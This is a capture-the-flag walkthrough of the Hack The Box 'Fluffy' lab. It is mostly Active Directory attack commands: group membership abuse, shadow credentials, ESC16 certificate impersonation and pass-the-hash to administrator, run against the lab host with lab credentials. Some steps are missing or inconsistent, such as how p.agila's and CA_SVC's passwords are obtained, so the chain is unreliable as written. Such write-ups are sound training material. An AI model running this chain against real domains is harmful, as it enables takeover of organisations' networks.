---
title: Fluffy
categories: [HackTheBox]
tags: [Windows, easy, Active Directory, SMB, certificate abuse]
image: images/Fluffy/Fluffy.jpg
---

# HTB - Fluffy | Windows Easy Box Walkthrough

Welcome to the Hack The Box **Fluffy** walkthrough! This **easy Windows machine** challenges us with Active Directory misconfigurations, an SMB share exploit (CVE-2025-24071), and certificate abuse for privilege escalation. We’ll cover:
- Network and SMB enumeration
- Capturing NTLM hashes
- Leveraging **Shadow Credentials** for lateral movement
- Exploiting **ESC16** to impersonate the domain administrator

**Provided Credentials:**
```text
j.fleischman:J0elTHEM4n1990!
```

## 1. Initial Reconnaissance
>[!danger] 
>Don’t forget to add dc01.fluffy.htb to your /etc/hosts.

Add the domain controller to `/etc/hosts`:
```bash
echo "10.10.11.69 dc01.fluffy.htb" >> /etc/hosts
```

Scan for open ports and services:
```bash
nmap 10.10.11.69 -sC -sV -p- -T4 -oN nmap_scan.txt
```
**Output**: Ports 53, 88, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985 (typical Domain Controller services).

## 2. SMB Enumeration
Enumerate SMB shares using provided credentials:
```bash
smbclient -L //10.10.11.69 -U j.fleischman%J0elTHEM4n1990!
```
**Note**: Check for writable shares or vulnerabilities related to CVE-2025-24071 (specific exploit details depend on the CVE).

## 3. BloodHound Enumeration
Collect Active Directory data:
```bash
# Option 1: Using bloodhound-python
bloodhound-python -u p.agila -p prometheusx-303 -d fluffy.htb -ns 10.10.11.69 -c All --zip

# Option 2: Using SharpHound (run on Windows or via Mono)
SharpHound.exe -c All -d fluffy.htb --ldapusername p.agila --ldappassword prometheusx-303 --domaincontroller 10.10.11.69
```

**BloodHound Analysis**:
In the BloodHound GUI, query “Shortest Paths to High-Value Targets” from `p.agila`:
- `p.agila` can be added to the `SERVICE ACCOUNTS` group.
- `SERVICE ACCOUNTS` has `GenericWrite` rights over `CA_SVC`.

**Troubleshooting**: Ensure DNS resolves `dc01.fluffy.htb` or use `10.10.11.69` for LDAP connectivity.

## 4. Adding p.agila to SERVICE ACCOUNTS
Add `p.agila` to the `SERVICE ACCOUNTS` group:
```bash
# Install bloodyAD: pip install bloodyAD
bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p prometheusx-303 add groupMember 'SERVICE ACCOUNTS' p.agila

# Alternative (Windows attack machine):
net rpc group addmem "SERVICE ACCOUNTS" p.agila -S 10.10.11.69 -U fluffy.htb\p.agila%prometheusx-303
```

## 5. Shadow Credentials
Create a shadow credential for `WINRM_SVC`:
```bash
certipy-ad shadow -u p.agila@fluffy.htb -p prometheusx-303 -account WINRM_SVC -dc-ip 10.10.11.69
```

Authenticate with the generated `.pfx`:
```bash
certipy-ad auth -pfx WINRM_SVC.pfx -domain fluffy.htb -dc-ip 10.10.11.69
```

Find vulnerable certificate templates:
```bash
certipy-ad find -vulnerable -u CA_SVC@fluffy.htb -p <CA_SVC_password> -dc-ip 10.10.11.69
```
**Note**: Replace `<CA_SVC_password>` with the password obtained after gaining control of `CA_SVC`.

## 6. ESC16 Exploit
Change `CA_SVC`’s UPN to impersonate `administrator`:
```bash
# Option 1: Using Certipy
certipy-ad set-user-upn -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -t CA_SVC -upn administrator@fluffy.htb

# Option 2: Using bloodyAD
bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p prometheusx-303 set user userPrincipalName CA_SVC administrator@fluffy.htb
```

Request a certificate for `administrator`:
```bash
certipy-ad req -u CA_SVC@fluffy.htb -p <CA_SVC_password> -ca FLUFFY-CA -template UserAuthentication -target administrator@fluffy.htb -dc-ip 10.10.11.69
```

Authenticate and extract the NTLM hash:
```bash
certipy-ad auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.10.11.69 -hashes
```

## 7. Gaining Administrator Access
Connect as `administrator` using the NTLM hash:
```bash
evil-winrm -i 10.10.11.69 -u administrator -H <NTLM_hash_from_certipy>
```

**Troubleshooting**:
- If Certipy fails, verify LDAP connectivity: `ldapsearch -x -h 10.10.11.69 -D "p.agila@fluffy.htb" -w prometheusx-303`.
- Ensure the `.pfx` file is accessible and not corrupted.
- If `evil-winrm` fails, try `crackmapexec` to validate the hash:
  ```bash
  crackmapexec winrm 10.10.11.69 -u administrator -H <NTLM_hash>
  ```

## Conclusion
This walkthrough demonstrates enumerating a Windows Domain Controller, exploiting AD misconfigurations, and abusing certificate templates to gain administrator access. Key tools include Nmap, BloodHound, Certipy, and evil-winrm.